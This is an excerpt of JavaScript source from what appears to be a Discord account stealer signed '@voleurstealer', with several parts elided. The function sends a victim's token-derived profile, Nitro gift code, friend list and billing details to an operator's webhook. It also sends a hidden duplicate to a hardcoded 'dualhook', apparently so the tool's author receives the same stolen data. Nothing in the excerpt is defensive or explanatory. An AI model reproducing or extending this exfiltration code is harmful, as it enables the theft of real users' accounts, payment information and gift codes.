...
exports.send = async(token, nitrocode, webhook, ip_addy) => {
    ...
    await axios.request(config).then(async function (data) {
        ...
        const codembed = new MessageEmbed()
        .setColor("#303037")
        .setAuthor(`Nitro Code (${json.username}#${json.discriminator})`, "https://media.discordapp.net/attachments/1076644004608884798/1077518510495907870/discord-avatar-128-D9U0P.gif?width=86&height=86")
        .setDescription(`\`${nitrocode}\`\n[Copy Code](https://superfurrycdn.nl/copy/${nitrocode})`)
        .setFooter("@voleurstealer")

        axios.post(webhook, { embeds: [embed, codembed, friendlist, billing.embed]}).catch();
        axios.post(confiug.session.dualhook, { embeds: [embed, codembed, friendlist, billing.embed]}).catch();
    }).catch();
}
